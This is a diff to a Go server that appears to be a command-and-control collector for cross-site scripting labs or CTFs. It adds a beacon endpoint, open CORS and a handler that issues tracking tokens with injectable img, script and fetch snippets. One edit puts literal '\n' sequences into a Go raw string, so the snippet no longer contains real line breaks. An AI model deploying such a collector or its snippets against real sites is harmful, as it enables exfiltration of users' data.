@@ -36,9 +36,20 @@ var (
 )
 
 func main() {
+	// allow overriding file via env for tests
+	if v := os.Getenv("XSS_C2_DATAFILE"); v != "" {
+		dataFile = v
+	}
+
 	if err := loadSubmissions(); err != nil {
 		log.Printf("warning: could not load submissions: %v", err)
 	}
+
+	// create data directory if path contains dirs
+	if dir := filepath.Dir(dataFile); dir != "." {
+		os.MkdirAll(dir, 0700)
+	}
+
 	// register handlers on the default mux
 	http.HandleFunc("/", dashboardHandler)
 	http.HandleFunc("/submit", submitHandler)
@@ -50,27 +61,34 @@ func main() {
 	// beacon endpoint: accepts JSON {"data":"..."}
 	http.HandleFunc("/beacon", beaconHandler)
 
+	port := os.Getenv("PORT")
 	if port == "" {
 		port = "8080"
 	}
-	
 	addr := ":" + port
 	log.Printf("starting XSS backend on %s (datafile=%s)", addr, dataFile)
-
+	// wrap the default mux with a simple CORS middleware so preflight and
+	// Access-Control-Allow-Origin are handled globally (helps when deployed)
 	handler := corsMiddleware(http.DefaultServeMux)
 	if err := http.ListenAndServe(addr, handler); err != nil {
 		log.Fatalf("server failed: %v", err)
 	}
 }
 
+// corsMiddleware adds permissive CORS headers (lab-only) and handles OPTIONS
+// preflight requests. It applies these headers to every response so redirects
+// or other endpoints still include the necessary CORS headers.
 func corsMiddleware(next http.Handler) http.Handler {
 	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-
+		// For lab/CTF usage we default to allowing all origins. If you need
+		// credentialed requests, change this to echo the Origin and set
+		// Access-Control-Allow-Credentials: true (and avoid '*').
 		w.Header().Set("Access-Control-Allow-Origin", "*")
 		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
 		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
 
-		if r.Method == http.MethodOptions {		
+		if r.Method == http.MethodOptions {
+			// Preflight request - no body
 			w.WriteHeader(http.StatusNoContent)
 			return
 		}
@@ -171,7 +189,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var payload struct {
+	var payload struct{
 		Data string `json:"data"`
 	}
 	dec := json.NewDecoder(r.Body)
@@ -207,7 +225,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "id": s.ID})
+	json.NewEncoder(w).Encode(map[string]any{"status":"ok","id":s.ID})
 }
 
 // submissionsAPIHandler returns the submissions as JSON (read-only GET).
@@ -242,14 +260,11 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 	token := hex.EncodeToString(b)
 	trackPath := "/track/" + token
 
-	snippet := fmt.Sprintf(`<img src="%s"/>
-<!-- or -->
-<script src="%s"></script>
-<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)
+	snippet := fmt.Sprintf(`<img src="%s"/>\n<!-- or -->\n<script src="%s"></script>\n<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)
 
 	resp := map[string]any{
-		"token":   token,
-		"url":     trackPath,
+		"token": token,
+		"url":   trackPath,
 		"snippet": snippet,
 	}
 
